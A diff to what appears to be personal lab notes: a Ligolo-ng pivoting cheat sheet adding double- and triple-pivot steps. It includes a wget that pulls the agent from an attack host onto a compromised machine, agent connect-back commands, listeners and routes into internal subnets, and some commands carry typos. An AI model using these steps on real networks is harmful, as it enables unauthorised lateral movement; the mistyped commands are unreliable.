@@ -1,5 +1,5 @@
 
-## 🚀 Ligolo-ng Pivoting Cheat Sheet
+##  Ligolo-ng Pivoting Cheat Sheet
 
 ## 🔧 Install on Parrot OS (Proxy/Relay Server)
 
@@ -64,7 +64,7 @@ Transfer the agent from your Parrot machine to the compromised host (DMZ01).
 Bash
 
 ```
-wget http://10.10.15.65:8080/agent
+wget http://10.10.15.254:8123/agent
 ```
 
 
@@ -182,3 +182,66 @@ listener_add -addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
 #Essentially we're connecting the new jump server to our previous jump server and the first jump server is gonna forward all the traffic to our attack host
 ```
 
+## Transfer the ligolo agent to the new attack box
+- we can do this with any method feasible.
+```python
+#ligolo agent on the new pivot host
+./agent -connect <ip-address-of-the-previous-jump-box>:11601 -ignore cert
+```
+
+###### That's it!
+- In our ligolo-proxy interface, we can see that a new agent has joined.
+![[Pasted image 20260328111256.png]]
+
+```python
+#Setting up the route, in a new terminal
+sudo ip route add 172.16.6.0/24 dev ligolo-double
+```
+
+```python
+#Back in our ligolo proxy
+start -tun ligolo-double
+```
+
+## Moving to the third host (just do the same process)
+### Create a new network interface ligolo-triple
+
+```python
+sudo ip tuntap add user kali mode tun ligolo-triple
+sudo ip link set ligolo-triple up
+```
+
+### Back in our ligolo proxy interface
+- make sure that we are in the session of the second jump box.
+```
+listener_add -adddr 0.0.0.0:11601 --to 127.0.0.1:11601 -tcp
+```
+- we can do `listener_list` to confirm
+![[Pasted image 20260328112110.png]]
+### Transfer the ligolo agent to our new (3rd) machine
+```python
+./agent -connect <ip-of-previous-jump-box>:11601 -ignore cert
+```
+
+#### Back  in our ligolo proxy interface
+- we can see that a new agent has joined
+![[Pasted image 20260328112328.png]]
+#### Let's add the new network to our ligolo-triple interface
+
+```python
+sudo ip route add 172.16.10.0/24 dev ligolo-triple
+```
+
+#### Switch our session to our third pivot
+```python
+session
+3
+```
+
+#### Start the tunnel
+
+```python
+start --tun ligolo-triple
+```
+
+### And just like that we'll be able to access devices on the new network as well.
